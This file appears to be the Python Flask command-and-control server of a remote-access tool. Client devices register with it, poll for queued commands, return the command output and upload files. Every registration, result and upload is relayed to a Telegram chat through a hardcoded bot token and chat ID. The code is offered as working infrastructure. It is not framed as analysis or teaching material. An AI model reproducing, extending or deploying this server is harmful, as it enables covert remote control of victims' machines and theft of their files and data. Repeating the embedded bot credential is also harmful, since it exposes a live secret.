from flask import Flask, request, jsonify, abort
import os, json, time, requests

app = Flask(__name__)
DEVICE_FILE = "devices.json"
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

BOT_TOKEN = "7814616506:AAHixHaptUH9hPcLq3awDS3mqHGScs3y9Yc"
CHAT_ID = "7554840326"
COMMAND_QUEUE = {}

# Load/save devices
def load_devices():
    if os.path.exists(DEVICE_FILE):
        with open(DEVICE_FILE, "r") as f:
            return json.load(f)
    return {}

def save_devices(devices):
    with open(DEVICE_FILE, "w") as f:
        json.dump(devices, f)

devices = load_devices()

# Register device
@app.route("/register", methods=["POST"])
def register():
    data = request.json
    device_id = data.get("device_id")
    device_name = data.get("device_name")
    chat_id = data.get("chat_id")

    if device_id and device_name:
        devices[device_id] = {
            "device_name": device_name,
            "chat_id": chat_id,
            "last_seen": time.time()
        }
        save_devices(devices)

        msg = f"✅ Device connected:\nName: {device_name}\nID: {device_id}"
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
            "chat_id": CHAT_ID,
            "text": msg
        })
        return jsonify({"status": "registered"}), 200

    return jsonify({"error": "Missing fields"}), 400

# Heartbeat
@app.route("/heartbeat/<device_id>", methods=["POST"])
def heartbeat(device_id):
    if device_id not in devices:
        return abort(404)
    devices[device_id]["last_seen"] = time.time()
    save_devices(devices)
    return jsonify({"status": "ok"}), 200

# Ping check
@app.route("/ping/<device_id>", methods=["GET"])
def ping_device(device_id):
    if device_id not in devices:
        return abort(404)
    last_seen = devices[device_id].get("last_seen", 0)
    if time.time() - last_seen <= 15:
        return jsonify({"status": "alive"}), 200
    else:
        return jsonify({"status": "offline"}), 503

# Get all registered devices
@app.route("/devices", methods=["GET"])
def get_devices():
    return jsonify({
        "devices": [
            {
                "device_id": device_id,
                "device_name": device["device_name"]
            } for device_id, device in devices.items()
        ]
    }), 200

# Queue command for device
@app.route("/command", methods=["POST"])
def send_command():
    data = request.json
    device_id = data.get("device_id")
    command = data.get("command")
    args = data.get("args", "")

    if device_id:
        COMMAND_QUEUE[device_id] = {
            "command": command,
            "args": args
        }
        print(f"[COMMAND] To {device_id}: {command} {args}")
        return jsonify({"status": "sent"}), 200

    return jsonify({"error": "Invalid request"}), 400

# Let device fetch next command
@app.route("/get_command/<device_id>", methods=["GET"])
def get_command(device_id):
    if device_id not in COMMAND_QUEUE:
        return jsonify({"command": None})
    return jsonify(COMMAND_QUEUE.pop(device_id))

# Device posts command result
@app.route("/result", methods=["POST"])
def receive_result():
    data = request.json
    output = data.get("output")
    device_id = data.get("device_id")

    device_name = devices.get(device_id, {}).get("device_name", "Unknown")
    message = f"🖥️ *{device_name}* (`{device_id}`)\n\n" + f"```{output.strip()[:4000]}```"

    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    })

    return jsonify({"status": "received"}), 200

# Receive uploaded file from device
@app.route("/upload/<device_id>", methods=["POST"])
def receive_upload(device_id):
    if 'file' not in request.files:
        return jsonify({"error": "No file part"}), 400

    file = request.files['file']
    filename = f"{device_id}_{file.filename}"
    save_path = os.path.join(UPLOAD_DIR, filename)
    file.save(save_path)

    msg = f"📂 File uploaded from {device_id}:\n`{filename}`"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
        "chat_id": CHAT_ID,
        "text": msg,
        "parse_mode": "Markdown"
    })

    return jsonify({"status": "saved", "file": filename}), 200

# Start Flask server
if __name__ == "__main__":
    print("Flask server running on http://0.0.0.0:10000")
    app.run(host="0.0.0.0", port=10000)
